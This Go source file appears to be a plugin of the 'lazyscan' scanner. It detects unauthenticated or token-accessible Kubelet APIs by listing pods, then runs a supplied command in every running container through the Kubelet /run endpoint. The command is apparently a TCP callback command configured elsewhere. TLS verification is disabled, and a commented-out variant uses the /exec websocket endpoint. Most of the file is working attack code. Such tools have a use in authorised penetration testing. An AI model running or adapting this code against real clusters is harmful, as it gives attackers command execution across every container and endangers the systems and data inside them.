package plugins

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"
	"github.com/404tk/lazyscan/pkg/schema"
	"github.com/tidwall/gjson"
	"golang.org/x/net/http2"
)

func KubeletScan(info *common.HostInfo) bool {
	opts := schema.K8sRequestOption{
		Token:    info.Token,
		Endpoint: fmt.Sprintf("https://%s:%s", info.Host, info.Port),
		Api:      "/pods",
		Method:   "GET",
	}

	resp, err := schema.ServerAccountRequest(opts)
	if err != nil || !strings.Contains(resp, "items") {
		return false
	}

	pods := gjson.Get(resp, "items").Array()
	result := fmt.Sprintf("[%s:%s] may be kubelet api unauth, there are %d pods.", info.Host, info.Port, len(pods))
	log.Println(result)
	if info.Queue != nil {
		vuln := common.Vuln{
			Host: info.Host,
			Port: info.Port,
		}
		if info.Token == "" {
			vuln.Unauth = true
		} else {
			vuln.Token = info.Token
		}
		info.Queue.Push(vuln)
	}

	if info.DisableExp && info.Command == "" {
		return true
	}
	var cmd string
	if !info.DisableExp {
		cmd = info.Commands.TCPCommand
	} else {
		cmd = info.Command
	}
	// batch command execution
	if cmd != "" {
		for _, item := range pods {
			pod := item.Get("metadata.name").String()
			namespace := item.Get("metadata.namespace").String()
			status := item.Get("status.phase").String()
			if status != "Running" {
				continue
			}
			containers := item.Get("spec.containers").Array()
			for _, c := range containers {
				// 批量pods执行时忽略报错
				// api := fmt.Sprintf(opts.Endpoint+
				// "/exec/%s/%s/%s?command=/bin/sh&command=-c&command=%s&error=1&output=1",
				// namespace, pod, c.Get("name").String(), urlecd)
				api := fmt.Sprintf(opts.Endpoint+
					"/run/%s/%s/%s", namespace, pod, c.Get("name").String())
				kubeletExec(info, api, url.QueryEscape(cmd))
			}
		}
	}
	return true
}

func kubeletExec(info *common.HostInfo, api, cmd string) bool {
	httpclient := &http.Client{
		Transport: &http2.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: time.Second * 20,
	}
	req, err := http.NewRequest("POST", api, bytes.NewBuffer([]byte("cmd="+cmd)))
	if err != nil {
		return false
	}
	if info.Token != "" {
		req.Header.Add("Authorization", "Bearer "+strings.TrimSuffix(info.Token, "\n"))
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	resp, err := httpclient.Do(req)
	if err != nil {
		return false
	}
	raw, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}
	if resp.StatusCode == http.StatusOK {
		if info.Command != "" {
			fmt.Println(api)
			fmt.Println(string(raw))
		}
		return true
	}
	return false
}

// Use API /exec/
/*
func kubeletExec(info *common.HostInfo, api string) bool {
	httpclient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: time.Second * 20,
	}
	req, err := http.NewRequest("GET", api, nil)
	if err != nil {
		return false
	}
	if info.Token != "" {
		req.Header.Add("Authorization", "Bearer "+strings.TrimSuffix(info.Token, "\n"))
	}
	req.Header.Add("Connection", "Upgrade")
	req.Header.Add("Upgrade", "websocket")
	req.Header.Add("Sec-Websocket-Version", "13")
	req.Header.Add("Sec-Websocket-Key", "lazyscan")

	resp, err := httpclient.Do(req)
	if err != nil {
		return false
	}
	raw, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}
	if resp.StatusCode == http.StatusSwitchingProtocols {
		if info.Command != "" {
			fmt.Println(string(raw))
		}
		return true
	}
	return false
}
*/
